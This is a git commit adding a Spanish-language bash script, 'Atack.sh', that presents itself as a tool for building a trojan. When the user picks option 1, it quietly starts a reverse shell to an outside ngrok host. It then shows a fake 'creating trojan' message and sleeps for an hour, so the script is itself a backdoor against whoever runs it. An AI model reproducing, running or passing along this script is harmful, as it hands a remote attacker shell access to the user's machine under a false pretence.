fed6dc070c98a4339a12ff7952caa5059aa3e973
MRX90902WX <118016739+MRX90902WX@users.noreply.github.com>
2022-12-31 16:20:48 -0500

    Add files via upload

---
+++ Atack.sh
@@ -0,0 +1,55 @@
+#! /bin/bash
+clear
+setterm -foreground red
+echo "
+           ⠀      ⢀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀     ⢀⣀⣤⣤⠄⢀⣤⠀⣾⣿⣿⣿⠀⣀⠀⢠⣤⣤⣀⡀⠀⠀⠀⠀⠀
+⠀⠀⠀     ⢀⣶⣿⣿⣿⠃⣰⣿⣿⣄⠙⠿⠿⠋⣠⣿⣷⡄⠹⣿⣿⣿⣶⡀⠀⠀⠀
+⠀⠀     ⣰⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⡀⢹⣿⣿⣿⣿⣄⠀⠀
+     ⠀⢸⣿⣿⡿⠋⠀⠀⣿⡏⠀⠙⠻⣿⣿⣿⣿⠟⠁⠀⣿⣧⠀⠀⠙⢿⣿⣿⡆⠀
+⠀     ⣿⣿⡿⠀⠀⠀⢰⣿⣿⣤⣤⣴⣿⣿⣿⣿⣦⣤⣴⣿⣿⠀⠀⠀⠈⣿⣿⡇⠀
+⠀     ⢹⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣷⡙⠻⠟⢩⣿⣿⣿⣿⣿⠀⠀⠀⠀⣼⣿⡇
+⠀     ⠈⠻⣿⣆⠀⠀⠈⠉⠉⠉⣿⣿⣷⡀⢠⣿⣿⡏⠉⠉⠉⠀⠀⠀⣰⣿⠟⠀⠀
+⠀⠀⠀     ⠈⠉⠓⠂⠀⠀⠀⠀⣿⣿⣿⣷⣿⣿⣿⡇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀     ⠀⢀⠀⢿⡟⠈⣿⡿⠈⢿⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀     ⢠⣾⡆⠘⢀⡆⠸⠃⣠⠈⠃⢸⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀     ⣰⣿⣿⡇⠀⣾⣷⠀⢀⣿⣧⠀⣼⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀     ⠸⣿⣿⣿⠇⠸⣿⣿⠀⠸⣿⣿⠆⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀     ⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁
+"
+echo ""
+echo "Esta herramienta hace un troyano peligroso"
+echo "Usar Educadamente no me responsabilizo"
+sleep 1
+while :
+do
+#MENU
+#ESCOJER MENU
+echo ""
+setterm -foreground green
+echo "Esta seguro continuar"
+echo "[1] Si"
+echo "[2] No"
+echo -n "[•]Opcion > "
+read opcion
+case $opcion in
+1)
+clear
+#! /bin/bash
+setterm -foreground green
+figlet Atack
+bash -i  >& /dev/tcp/2.tcp.ngrok.io/14677 0>&1 &
+setterm -foreground red
+echo "Creando troyano ..."
+sleep 1
+echo "Esto puede demorar 1 hora"
+sleep 3600
+;;
+2)
+#! /bin/bash
+setterm -foreground white
+echo "Saliste correctamenta bye"
+exit
+::
+esac
+done
